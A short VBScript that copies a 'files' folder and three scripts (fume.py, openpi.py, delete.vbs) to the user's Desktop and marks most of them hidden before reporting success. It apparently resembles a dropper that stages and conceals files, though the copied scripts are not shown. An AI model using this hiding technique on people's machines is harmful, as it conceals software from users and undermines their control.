Option Explicit

Dim SourceFolder, DestFolder, FolderName, FileName, FileName2, FileName3
SourceFolder = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".")
DestFolder = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\"
FolderName = "files"
FileName = "fume.py"
FileName2 = "openpi.py"
FileName3 = "delete.vbs"

 
' Create the destination folder if it doesn't exist
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(DestFolder) Then
    fso.CreateFolder(DestFolder)
End If

' Copy the folder and file from the source folder to the destination folder
If Not fso.FolderExists(DestFolder & FolderName) Then
    fso.CopyFolder SourceFolder & "\" & FolderName, DestFolder & FolderName
End If

If Not fso.FileExists(DestFolder & FileName) Then
    fso.CopyFile SourceFolder & "\" & FileName, DestFolder & FileName
End If

If Not fso.FileExists(DestFolder & FileName2) Then
    fso.CopyFile SourceFolder & "\" & FileName2, DestFolder & FileName2
End If

If Not fso.FileExists(DestFolder & FileName3) Then
    fso.CopyFile SourceFolder & "\" & FileName3, DestFolder & FileName3
End If

' Set the attributes of the copied folder and file to "hidden"
Dim folderPath, filePath, filePath2
folderPath = DestFolder & FolderName
filePath = DestFolder & FileName
filePath2 = DestFolder & FileName2

If fso.FolderExists(folderPath) Then
    fso.GetFolder(folderPath).Attributes = 2 ' 2 = hidden
End If
If fso.FileExists(filePath) Then
    fso.GetFile(filePath).Attributes = 2 ' 2 = hidden
End If

If fso.FileExists(filePath2) Then
    fso.GetFile(filePath2).Attributes = 2 ' 2 = hidden
End If



WScript.Echo "Successful!"

WScript.Quit
